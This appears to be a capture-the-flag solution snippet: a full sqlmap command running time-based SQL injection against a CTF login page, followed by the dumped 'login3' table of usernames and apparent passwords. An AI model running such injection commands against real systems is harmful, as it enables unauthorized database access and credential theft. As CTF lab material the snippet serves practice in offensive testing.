sqlmap -u http://web.camsctf.com/15/login.php --data='user=*&pass=*' -p user --random-agent --level=5 --risk=3 --tables --dbms=MySQL --technique=T

# Database: camscsco_web15
# Table: login3
# [3 entries]
# +-------------+--------------+
# | meowz       | usuario      |
# +-------------+--------------+
# | 2gRD3f4sfWf | support      |
# | B8zPAkFQYN4 | iamjustsenda |
# | S9Ysfu4xKxU | bobb         |
# +-------------+--------------+
